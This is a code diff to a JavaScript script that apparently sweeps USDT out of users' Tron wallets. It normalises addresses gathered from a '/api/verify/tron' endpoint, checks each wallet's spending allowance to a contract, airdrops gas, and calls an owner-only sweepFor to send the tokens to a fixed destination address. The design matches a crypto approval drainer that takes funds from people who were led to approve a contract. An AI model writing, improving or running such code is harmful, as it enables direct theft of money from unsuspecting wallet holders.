@@ -103,13 +103,17 @@ const err  = (msg) => console.error(`[${new Date().toISOString()}] ${TAG} ✖  $
 // ── Address helpers ───────────────────────────────────────────────────────────
 
 /**
- * Convert EVM hex (0x + 20 bytes) → Tron base58.
- * Tron mainnet prefix is 0x41; tronWeb.address.fromHex() expects that form.
+ * Normalize any address form to Tron base58 (T…).
+ * Supabase stores base58 from /api/verify/tron — do NOT assume hex.
  */
-function hexToBase58(hexAddr) {
+function toBase58(addr) {
+  if (!addr || typeof addr !== "string") return null;
   try {
-    const clean   = hexAddr.replace(/^0x/, "");
-    const tronHex = "41" + clean;
+    // Already base58 Tron address
+    if (/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr)) return addr;
+    // Hex with or without 0x / 41 prefix
+    const clean = addr.replace(/^0x/i, "").toLowerCase();
+    const tronHex = clean.startsWith("41") && clean.length === 42 ? clean : "41" + clean.padStart(40, "0");
     return tronWeb.address.fromHex(tronHex);
   } catch {
     return null;
@@ -160,13 +164,12 @@ async function sendGasIfNeeded(base58Addr) {
 
 // ── Sweep ─────────────────────────────────────────────────────────────────────
 
-async function sweepWallet(hexAddr) {
-  if (sweeping.has(hexAddr)) return;
-  sweeping.add(hexAddr);
+async function sweepWallet(addr) {
+  const base58Addr = toBase58(addr);
+  if (!base58Addr) { err(`Cannot normalize address: ${addr}`); return; }
+  if (sweeping.has(base58Addr)) return;
+  sweeping.add(base58Addr);
   try {
-    const base58Addr = hexToBase58(hexAddr);
-    if (!base58Addr) { err(`Cannot convert to base58: ${hexAddr}`); return; }
-
     // 1. Check USDT balance
     const usdtBal = await getUsdtBalance(base58Addr);
     if (usdtBal < MIN_USDT_SUN) {
@@ -175,10 +178,24 @@ async function sweepWallet(hexAddr) {
     }
     log(`${base58Addr} — USDT ${(Number(usdtBal) / 1e6).toFixed(2)} — sweeping`);
 
-    // 2. Airdrop TRX gas if needed
+    // 2. Confirm allowance to our contract (spender must be contract, not relayer)
+    try {
+      const usdt = await tronWeb.contract().at(USDT_TRC20);
+      const allowRaw = await usdt.allowance(base58Addr, CONTRACT_ADDRESS).call();
+      const allow = BigInt(allowRaw.toString());
+      if (allow < MIN_USDT_SUN) {
+        warn(`${base58Addr} — allowance to contract is ${(Number(allow) / 1e6).toFixed(6)} — skip (need approve to ${CONTRACT_ADDRESS})`);
+        return;
+      }
+      log(`${base58Addr} — allowance OK (${(Number(allow) / 1e6).toFixed(2)} USDT)`);
+    } catch (e) {
+      warn(`allowance check failed (continuing): ${e.message}`);
+    }
+
+    // 3. Airdrop TRX gas if needed (owner pays energy for sweepFor, but keep for safety)
     await sendGasIfNeeded(base58Addr);
 
-    // 3. Call sweepFor(user, [USDT]) on TronV2 contract
+    // 4. Call sweepFor(user, [USDT]) — TronV2: onlyOwner
     log(`sweepFor(${base58Addr}, [USDT]) → ${DESTINATION_ADDRESS}`);
     const contract = tronWeb.contract(TRONV2_ABI, CONTRACT_ADDRESS);
     const txHash   = await contract.sweepFor(base58Addr, [USDT_TRC20]).send({
@@ -188,9 +205,9 @@ async function sweepWallet(hexAddr) {
     });
     log(`sweepFor tx: ${txHash}`);
   } catch (e) {
-    err(`sweepWallet ${hexAddr}: ${e.message}`);
+    err(`sweepWallet ${base58Addr}: ${e.message}`);
   } finally {
-    sweeping.delete(hexAddr);
+    sweeping.delete(base58Addr);
   }
 }
 
